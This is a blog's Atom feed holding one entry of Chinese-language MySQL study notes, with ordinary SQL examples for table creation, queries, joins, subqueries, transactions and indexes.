<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rayii&#39;s blog</title>
  
  
  <link href="https://1xueyu1.github.io/atom.xml" rel="self"/>
  
  <link href="https://1xueyu1.github.io/"/>
  <updated>2024-07-31T03:36:59.150Z</updated>
  <id>https://1xueyu1.github.io/</id>
  
  <author>
    <name>Rayii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MySQL</title>
    <link href="https://1xueyu1.github.io/2024/07/23/MySQL/"/>
    <id>https://1xueyu1.github.io/2024/07/23/MySQL/</id>
    <published>2024-07-23T04:03:27.000Z</published>
    <updated>2024-07-31T03:36:59.150Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>分类</p><p><img src="/2024/07/23/MySQL/image-20240723120501345.png" alt="image-20240723120501345"></p><h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p><img src="/2024/07/23/MySQL/image-20240723232007309.png" alt="image-20240723232007309"></p><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><p><img src="/2024/07/23/MySQL/image-20240723233144720.png" alt="image-20240723233144720"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment comment &quot;ID, 唯一标识&quot;,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment &quot;用户名&quot;,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment &quot;姓名&quot;,</span><br><span class="line">    age <span class="type">int</span> comment &quot;年龄&quot;,</span><br><span class="line">    gender <span class="type">char</span>(<span class="number">1</span>) <span class="keyword">default</span> <span class="string">&#x27;男&#x27;</span> comment &quot;性别&quot;</span><br><span class="line">) comment &quot;用户表&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240723234746240.png" alt="image-20240723234746240"></p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><h5 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h5><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h5 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h5><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01&#x2F;9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901&#x2F;2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值</td></tr></tbody></table><h5 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h5><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr></tbody></table><h4 id="DDL（表操作）"><a href="#DDL（表操作）" class="headerlink" title="DDL（表操作）"></a>DDL（表操作）</h4><p><img src="/2024/07/23/MySQL/image-20240724115553354.png" alt="image-20240724115553354"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> tb_emp;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240724115619363.png" alt="image-20240724115619363"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp <span class="keyword">add</span> qq <span class="type">varchar</span>(<span class="number">11</span>) comment &quot;QQ&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp modify qq <span class="type">varchar</span>(<span class="number">13</span>) comment <span class="string">&#x27;QQ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp change qq qq_num <span class="type">varchar</span>(<span class="number">13</span>) comment <span class="string">&#x27;QQ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp <span class="keyword">drop</span> <span class="keyword">column</span> qq_num;</span><br><span class="line"></span><br><span class="line">rename <span class="keyword">table</span> db01.tb_emp <span class="keyword">to</span> emp;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240724120321788.png" alt="image-20240724120321788"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> tb_emp;</span><br></pre></td></tr></table></figure><h2 id="DML修改数据"><a href="#DML修改数据" class="headerlink" title="DML修改数据"></a>DML修改数据</h2><p><strong>插入数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_emp(id, username, password, name, gender, image, job, entrydate, create_time, update_time)</span><br><span class="line">            <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;xue&#x27;</span>, <span class="string">&#x27;p-0p-0p-0&#x27;</span>, &quot;Ray&quot;, <span class="number">1</span>, <span class="keyword">null</span>, <span class="number">1</span>, <span class="string">&#x27;2020-01-01&#x27;</span>, now(), now());</span><br><span class="line"><span class="comment">-- 插入单条数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_emp(username, name, gender, entrydate, create_time, update_time)</span><br><span class="line">    <span class="keyword">values</span>(&quot;xue1&quot;, &quot;Ray1&quot;,  <span class="number">2</span>, <span class="string">&#x27;2019-05-07&#x27;</span>, now(), now());</span><br><span class="line"># 批量插入数据</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_emp(username, name, gender, entrydate, create_time, update_time) <span class="keyword">values</span></span><br><span class="line">                  (&quot;xue2&quot;, &quot;Ray2&quot;,  <span class="number">2</span>, <span class="string">&#x27;2019-05-07&#x27;</span>, now(), now()),</span><br><span class="line">                  (&quot;xue3&quot;, &quot;Ray3&quot;,  <span class="number">2</span>, <span class="string">&#x27;2019-05-07&#x27;</span>, now(), now());</span><br></pre></td></tr></table></figure><p><strong>修改数据</strong></p><p><img src="/2024/07/23/MySQL/image-20240724150134845.png" alt="image-20240724150134845"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 单点修改</span></span><br><span class="line"><span class="keyword">update</span> tb_emp <span class="keyword">set</span>  name <span class="operator">=</span> <span class="string">&#x27;zhangsan&#x27;</span>, update_time <span class="operator">=</span> now() <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">-- 批量修改</span></span><br><span class="line"><span class="keyword">update</span> tb_emp <span class="keyword">set</span> entrydate <span class="operator">=</span> <span class="string">&#x27;2000-07-01&#x27;</span>, update_time <span class="operator">=</span> now();</span><br></pre></td></tr></table></figure><p><strong>删除数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 删除单条数据</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="comment">-- 删除所有数据</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_emp</span><br></pre></td></tr></table></figure><h2 id="DQL查询操作"><a href="#DQL查询操作" class="headerlink" title="DQL查询操作"></a>DQL查询操作</h2><h3 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h3><p><img src="/2024/07/23/MySQL/image-20240724151418743.png" alt="image-20240724151418743"></p><p><img src="/2024/07/23/MySQL/image-20240724153213690.png" alt="image-20240724153213690"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询指定字段</span></span><br><span class="line"><span class="keyword">select</span> name, entrydate <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询所有字段</span></span><br><span class="line"><span class="comment">-- 直观，推荐</span></span><br><span class="line"><span class="keyword">select</span> id, username, password, name, gender, image, job, entrydate, create_time, update_time <span class="keyword">from</span> tb_emp;</span><br><span class="line"><span class="comment">-- 不推荐，性能低</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 起别名</span></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> 姓名, entrydate <span class="keyword">as</span> 入职日期 <span class="keyword">from</span> tb_emp;</span><br><span class="line"><span class="keyword">select</span> name <span class="string">&#x27;姓名&#x27;</span>, entrydate <span class="keyword">as</span> <span class="string">&#x27;入职日期&#x27;</span> <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 去除重复记录 distinct</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure><h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><p><img src="/2024/07/23/MySQL/image-20240724165648090.png" alt="image-20240724165648090"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查找姓名为2个字的</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;__&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> job <span class="keyword">in</span> (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="comment">-- 查找姓名以 张 开头的</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;张%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;_&#x27;</span>代表单个字符, <span class="operator">%</span>代表多个字符</span><br></pre></td></tr></table></figure><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 聚合函数：不对null进行运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- count() - 查询表中有多少条数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(id) <span class="keyword">from</span> tb_emp;</span><br><span class="line"><span class="comment">-- 推荐</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- min() - 统计最小的</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(entrydate) <span class="keyword">from</span> tb_emp;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(entrydate) <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- avg() - 统计平均值</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(id) <span class="keyword">from</span> tb_emp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sum() - 求和</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(id) <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure><h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 根据性别</span></span><br><span class="line"><span class="keyword">select</span> gender, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> tb_emp <span class="keyword">group</span> <span class="keyword">by</span> gender ;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240724171313203.png" alt="image-20240724171313203"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询满足入职条件下，对工作进行分类，选取数量&gt;=2的工作</span></span><br><span class="line"><span class="keyword">select</span> job, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> tb_emp <span class="keyword">where</span> entrydate <span class="operator">&lt;=</span> <span class="string">&#x27;2024-01-01&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> job <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240724171619405.png" alt="image-20240724171619405"></p><h3 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h3><p><img src="/2024/07/23/MySQL/image-20240724171807323.png" alt="image-20240724171807323"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASC:升序（默认）</span><br><span class="line">DESC:降序</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">order</span> <span class="keyword">by</span> entrydate ;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">order</span> <span class="keyword">by</span> entrydate <span class="keyword">desc</span> ;</span><br><span class="line"><span class="comment">-- 第一个字段相同时才按照第二字段排序</span></span><br><span class="line"><span class="comment">-- 入职时间相同的按照更新时间降序排列</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">order</span> <span class="keyword">by</span> entrydate, update_time <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p><img src="/2024/07/23/MySQL/image-20240724172418073.png" alt="image-20240724172418073"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp limit <span class="number">0</span>, <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240724172710019.png" alt="image-20240724172710019"></p><p><strong>条件判断</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- if函数</span></span><br><span class="line"><span class="keyword">select</span> if(gender <span class="operator">=</span> <span class="number">1</span>, &quot;男&quot;, &quot;女&quot;) 性别, <span class="built_in">count</span>(<span class="operator">*</span>) 人数 <span class="keyword">from</span> tb_emp <span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- case 函数</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    <span class="keyword">case</span> job <span class="keyword">when</span> <span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;班主任&#x27;</span> <span class="keyword">when</span> <span class="number">2</span> <span class="keyword">then</span> <span class="string">&#x27;讲师&#x27;</span> <span class="keyword">when</span> <span class="number">3</span> <span class="keyword">then</span> <span class="string">&#x27;学工主管&#x27;</span> <span class="keyword">when</span> <span class="number">4</span> <span class="keyword">then</span> <span class="string">&#x27;教研主管&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;未分配&#x27;</span> <span class="keyword">end</span> 职位,</span><br><span class="line">    <span class="built_in">count</span>(<span class="operator">*</span>) 数量</span><br><span class="line"><span class="keyword">from</span> tb_emp <span class="keyword">group</span> <span class="keyword">by</span> job ;</span><br></pre></td></tr></table></figure><h2 id="多表设计"><a href="#多表设计" class="headerlink" title="多表设计"></a>多表设计</h2><h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><p><strong>外键</strong></p><p><img src="/2024/07/23/MySQL/image-20240730104927839.png" alt="image-20240730104927839"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp</span><br><span class="line"><span class="keyword">add</span> <span class="keyword">constraint</span> tb_emp_fk_dept_id</span><br><span class="line"><span class="keyword">foreign</span> key (dept_id) <span class="keyword">references</span></span><br><span class="line">tb_dept(id);</span><br></pre></td></tr></table></figure><h3 id="一对一、多对多"><a href="#一对一、多对多" class="headerlink" title="一对一、多对多"></a>一对一、多对多</h3><p><img src="/2024/07/23/MySQL/image-20240730105458344.png" alt="image-20240730105458344"></p><p><img src="/2024/07/23/MySQL/image-20240730105815714.png" alt="image-20240730105815714"></p><p>多对多需要一张中间表来关联</p><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 隐式:查员工姓名，及所属部门名称</span></span><br><span class="line"><span class="keyword">select</span> tb_emp.name,tb_dept.name <span class="keyword">from</span> tb_emp, tb_dept <span class="keyword">where</span> tb_emp.id <span class="operator">=</span> tb_dept.id;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 显式</span></span><br><span class="line"><span class="keyword">select</span> tb_emp.name,tb_dept.id <span class="keyword">from</span> tb_emp <span class="keyword">inner</span> <span class="keyword">join</span> tb_dept <span class="keyword">on</span> tb_emp.dept_id <span class="operator">=</span> tb_dept.id;</span><br></pre></td></tr></table></figure><h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><p><img src="/2024/07/23/MySQL/image-20240730134835336.png" alt="image-20240730134835336"></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 左右外连接</span></span><br><span class="line"><span class="comment">-- 左连接包括左表的所有数据</span></span><br><span class="line"><span class="keyword">select</span> e.name, d.name <span class="keyword">from</span> tb_emp e <span class="keyword">left</span> <span class="keyword">join</span> tb_dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id;</span><br></pre></td></tr></table></figure><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p><img src="/2024/07/23/MySQL/image-20240730135449867.png" alt="image-20240730135449867"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 标量子查询</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="operator">=</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tb_dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;教研部&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> (<span class="keyword">select</span> entrydate <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;方东白&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 列子查询</span></span><br><span class="line"><span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="keyword">in</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tb_dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;教研部&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;咨询部&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 行子查询</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> (entrydate, job) <span class="operator">=</span> (<span class="keyword">select</span> entrydate, job <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;xue&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 表子查询</span></span><br><span class="line"><span class="comment">-- 将这个作为表查询 (select * from tb_emp where entrydate &gt; &#x27;2006-01-01&#x27;)</span></span><br><span class="line"><span class="keyword">select</span> e.<span class="operator">*</span>, d.name <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> <span class="string">&#x27;2006-01-01&#x27;</span>) e, tb_dept d <span class="keyword">where</span> e.dept_id <span class="operator">=</span> d.id;</span><br></pre></td></tr></table></figure><h3 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询每个分类下最贵的菜品 </span></span><br><span class="line"><span class="keyword">select</span> c.name, <span class="built_in">max</span>(d.price) <span class="keyword">from</span> dish d, category c <span class="keyword">where</span> d.category_id <span class="operator">=</span> c.id <span class="keyword">group</span> <span class="keyword">by</span> c.name;</span><br><span class="line"><span class="comment">-- 每个分类下菜品数量&gt;=3的</span></span><br><span class="line"><span class="keyword">select</span> c.name, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dish d, category c <span class="keyword">where</span> d.category_id <span class="operator">=</span> c.id <span class="keyword">group</span> <span class="keyword">by</span> c.name <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">-- +</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dish <span class="keyword">where</span> price <span class="operator">&lt;</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(price) <span class="keyword">from</span> dish);</span><br></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p><img src="/2024/07/23/MySQL/image-20240731111526585.png" alt="image-20240731111526585"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">start</span> transaction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">rollback</span>;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/23/MySQL/image-20240731111921737.png" alt="image-20240731111921737"></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>索引时帮助数据库高效获取数据的数据结构</p><p><img src="/2024/07/23/MySQL/image-20240731112655485.png" alt="image-20240731112655485"></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><img src="/2024/07/23/MySQL/image-20240731113200831.png" alt="image-20240731113200831"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建索引</span></span><br><span class="line"><span class="keyword">create</span> index idx_emp_name <span class="keyword">on</span> tb_emp(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看索引</span></span><br><span class="line"><span class="keyword">show</span> index <span 